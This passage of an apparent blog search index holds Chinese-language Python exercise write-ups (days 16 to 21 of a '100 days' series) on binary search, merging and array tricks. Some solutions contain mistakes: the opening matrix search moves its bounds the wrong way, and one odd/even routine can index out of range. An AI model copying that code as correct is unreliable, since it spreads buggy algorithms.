target:    :return:    """</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> matrix<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> matrix<span class="token punctuation">:</span>        <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> target <span class="token operator">&lt;=</span> item<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>            <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> j<span class="token punctuation">:</span>                m <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>                <span class="token keyword">if</span> item<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">elif</span> item<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&lt;</span> target<span class="token punctuation">:</span>                    j <span class="token operator">=</span> m <span class="token operator">-</span> <span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    i <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day21</title>
      <link href="//code/python/pythontip-100days-day21/"/>
      <url>//code/python/pythontip-100days-day21/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你两个升序整数数组 <code>nums1</code> 和 <code>nums2</code>，请你将 nums2 按升序合并到到新的数组并返回。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">merge([1,2,3],[2,5,6]) -&gt; [1,2,2,3,5,6]merge([1,2,3,7],[4,5,6]) -&gt; [1,2,3,4,5,6,7] <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的数组均不为空</li><li>输入的数组均为升序</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>利用数组有序的性质</li><li>避免全局排序</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span>nums2<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token number">0</span>    merged <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums1<span class="token punctuation">)</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> nums1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> nums2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            merged<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            merged<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            j <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> num <span class="token keyword">in</span> nums1<span class="token punctuation">[</span>i <span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">:</span>            merged<span class="token punctuation">.</span>append<span class="token punctuation">(</span>num<span class="token punctuation">)</span>     <span class="token keyword">if</span> j <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> num <span class="token keyword">in</span> nums2<span class="token punctuation">[</span>j <span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">:</span>            merged<span class="token punctuation">.</span>append<span class="token punctuation">(</span>num<span class="token punctuation">)</span>    <span class="token keyword">return</span> merged    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>利用数组有序的性质</li><li>避免全局排序</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day20</title>
      <link href="//code/python/pythontip-100days-day20/"/>
      <url>//code/python/pythontip-100days-day20/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个升序的整数数组，和一个整数，使用二分查找在数组中搜索该整数，返回最靠右的位置。</p><p>如果不存在返回-1</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">binarySearchRightmost([1,2,3,3,3,4],3) -&gt; 4binarySearchRightmost([10,14,20,21,22,22],22) -&gt; 5binarySearchRightmost([5,10,12],3) -&gt; -1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的数组不为空</li><li>输入的数组为升序</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>二分查找变形</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchRightmost</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    rightmost_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    left <span class="token punctuation">,</span> right <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span>            rightmost_idx <span class="token operator">=</span> mid            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">elif</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> target<span class="token punctuation">:</span>            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">elif</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&gt;</span> target<span class="token punctuation">:</span>            right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>     <span class="token keyword">return</span> rightmost_idx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(logn)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：1.二分查找变形</p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchRightmost</span><span class="token punctuation">(</span>nums<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> nums<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>    i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> j<span class="token punctuation">:</span>        m <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">if</span> target <span class="token operator">==</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">"""            1. 如果nums[m] == target，但是存在nums[m+1] == target，则应该继续判断            2. 将j作为右边界，控制m不会越界            """</span>            <span class="token keyword">if</span> m <span class="token operator">&lt;</span> j<span class="token punctuation">:</span>                <span class="token keyword">if</span> nums<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> m                <span class="token keyword">else</span><span class="token punctuation">:</span>                    i <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> m        <span class="token keyword">elif</span> target <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> m <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            i <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day19</title>
      <link href="//code/python/pythontip-100days-day19/"/>
      <url>//code/python/pythontip-100days-day19/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个数组，将数组中奇数放到偶数前面</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">oddEven([1,2,3,4,5]) -&gt; [1,3,5,4,2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的数组不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>快速排序变形</li></ol><h1 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h1><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">oddEven</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            i <span class="token operator">+=</span> <span class="token number">1</span>            nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> nums<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：1.快速排序变形</p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">oddEven</span><span class="token punctuation">(</span>nums<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> nums<span class="token punctuation">:</span>        <span class="token keyword">return</span> nums    i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> j<span class="token punctuation">:</span>        <span class="token keyword">while</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>            i <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">while</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>            j <span class="token operator">-=</span> <span class="token number">1</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> j<span class="token punctuation">:</span>            nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> nums<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day18</title>
      <link href="//code/python/pythontip-100days-day18/"/>
      <url>//code/python/pythontip-100days-day18/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>求两个数组的交集</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">intersection([1,2,3],[1,3,5]) -&gt; [1,3]intersection([1,2,3],[4,5,6]) -&gt; []<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的数组不含重复元素</li><li>输入的数组均不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>利用<code>set</code></li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-none"><code class="language-none">def intersection(nums_1,nums_2):    return list(set(nums_1) &amp; set(nums_2))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n^2)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：1.利用<code>set</code></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day17</title>
      <link href="//code/python/pythontip-100days-day17/"/>
      <url>//code/python/pythontip-100days-day17/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>升序排列的整数数组 nums 在预先未知的某个点上进行了旋转（例如， <code>[0,1,2,4,5,6,7]</code> 经旋转后可能变为<code>[4,5,6,7,0,1,2]</code> ）。请你在数组中搜索<code>target</code> ，如果数组中存在这个目标值，则返回它的索引，否则返回<code>-1</code>。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">searchRotate([4,5,6,7,0,1,2],4) -&gt; 0searchRotate([4,5,6,7,0,1,2],3) -&gt; -1searchRotate([4,5,6,7,0,1,2],1) -&gt; 5searchRotate([1],0) -&gt; -1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入数组不含重复元素</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>二分查找变形</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">searchRotate</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> nums<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>    i<span class="token punctuation">,</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> j<span class="token punctuation">:</span>        m <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">if</span> target <span class="token operator">==</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> m        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&lt;</span> target<span class="token punctuation">:</span>            <span class="token keyword">if</span> target <span class="token operator">&gt;=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">and</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                j <span class="token operator">=</span> m <span class="token operator">-</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                i <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> target <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&gt;</span> nums<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                i <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                j <span class="token operator">=</span> m <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>          <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(logn)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：1.二分查找变形</p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day16</title>
      <link href="//code/python/pythontip-100days-day16/"/>
      <url>//code/python/pythontip-100days-day16/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你两个二进制字符串，返回它们的和（用二进制表示）。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">addBinary('11','1') -&gt; '100'addBinary('1010','1011') -&gt; '10101'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入为 非空 字符串且只包含数字 1 和 0</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>模拟加法运算</li><li>注意进位</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">addBinary</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> a <span class="token keyword">or</span> <span class="token keyword">not</span> b<span class="token punctuation">:</span> <span class="token keyword">return</span> a <span class="token keyword">or</span> b    a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> ans <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment"># carry: 进位</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> carry <span class="token operator">=</span> <span class="token number">0</span>       <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">or</span> j <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">or</span> carry<span class="token punctuation">:</span>        n1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token number">0</span>        n2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> j <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token number">0</span>        carry<span class="token punctuation">,</span> cur <span class="token operator">=</span> <span class="token builtin">divmod</span><span class="token punctuation">(</span>n1 <span class="token operator">+</span> n2 <span class="token operator">+</span> carry<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        ans<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span>        i<span class="token punctuation">,</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ans<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>模拟加法运算</li><li>注意进位</li></ol><p><strong>算法</strong>：</p><ol><li>遍历两个二进制字符串，从低位开始相加，相加结果的模就是该位的值，商就是进位</li><li>对每一位做运算的时候要将进位加进来，没有进位则为零</li></ol><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">addBinary</span><span class="token punctuation">(</span>bin1<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> bin2<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 判断bin1、bin2的值是否为空，如果其中一个输入为空，则直接返回另一个输入；如果两个输入都为空，则返回空    2. 将二进制数字字符串转为数字，然后做加法运算    3. 将运算结果通过bin()方法转为字符串，取0b后面的部分    :param bin1:    :param bin2:    :return:    """</span>    <span class="token comment"># 判断bin1、bin2的值是否为空，如果其中一个输入为空，则直接返回另一个输入；如果两个输入都为空，则返回空</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bin1 <span class="token keyword">or</span> <span class="token keyword">not</span> bin2<span class="token punctuation">:</span> <span class="token keyword">return</span> bin1 <span class="token keyword">or</span> bin2    bin1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>bin1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    bin2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>bin2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>bin1 <span class="token operator">+</span> bin2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" 